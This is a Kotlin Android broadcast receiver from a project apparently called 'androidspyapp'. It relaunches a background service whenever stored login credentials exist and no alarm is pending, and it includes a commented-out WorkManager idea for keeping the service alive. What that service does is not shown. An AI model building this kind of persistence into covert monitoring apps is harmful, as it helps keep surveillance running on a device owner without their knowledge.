package com.komnacki.androidspyapp.receivers

import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.legacy.content.WakefulBroadcastReceiver
import com.komnacki.androidspyapp.MainActivity
import com.komnacki.androidspyapp.MainService


class ServiceReceiver : WakefulBroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent != null && intent.action != null) {
            val triggerIntent = Intent()
            if (context != null) {
                if (!isNextAlarmSet(context)) {
                    val prefs = context.getSharedPreferences(
                        MainActivity.SHARED_PREFERENCE_TAG,
                        Context.MODE_PRIVATE
                    )
                    val prefsUserEmail = prefs.getString(MainActivity.PREFS_USER_EMAIL, null)
                    val prefsUserPassword = prefs.getString(MainActivity.PREFS_USER_PASSWORD, null)
                    if (!prefsUserEmail.isNullOrBlank() && !prefsUserPassword.isNullOrBlank()) {
                        startService(context, triggerIntent)
                    }
                } else {
                    Log.d("KK: ", "Next alarm is set!")
                }
            }
        }
    }

    private fun startService(context: Context, triggerIntent: Intent) {
        Log.i("KK: ", "Credentials not null, start service!")
        triggerIntent.setClass(context, MainService::class.java)
        context.startService(triggerIntent)


        /*TODO: Check this way of keeping service alive
        val constraints = Constraints.Builder()
            .setRequiresCharging(true)
            .build()
        val workPolicy = ExistingPeriodicWorkPolicy.KEEP
        val work = PeriodicWorkRequestBuilder<IntervalWorker>(15, TimeUnit.SECONDS)
            .setConstraints(constraints)
            .build()
        val workManager = WorkManager.getInstance(context)
        workManager.enqueueUniquePeriodicWork("Kamil", workPolicy, work)
         */
    }

    private fun isNextAlarmSet(context: Context): Boolean {
        val prefs =
            context.getSharedPreferences(MainActivity.SHARED_PREFERENCE_TAG, Context.MODE_PRIVATE)
        val nextAlarmTime = prefs.getLong(MainActivity.PREFS_SERVICE_NEXT_ALARM, 0)
        return nextAlarmTime >= System.currentTimeMillis()
    }
}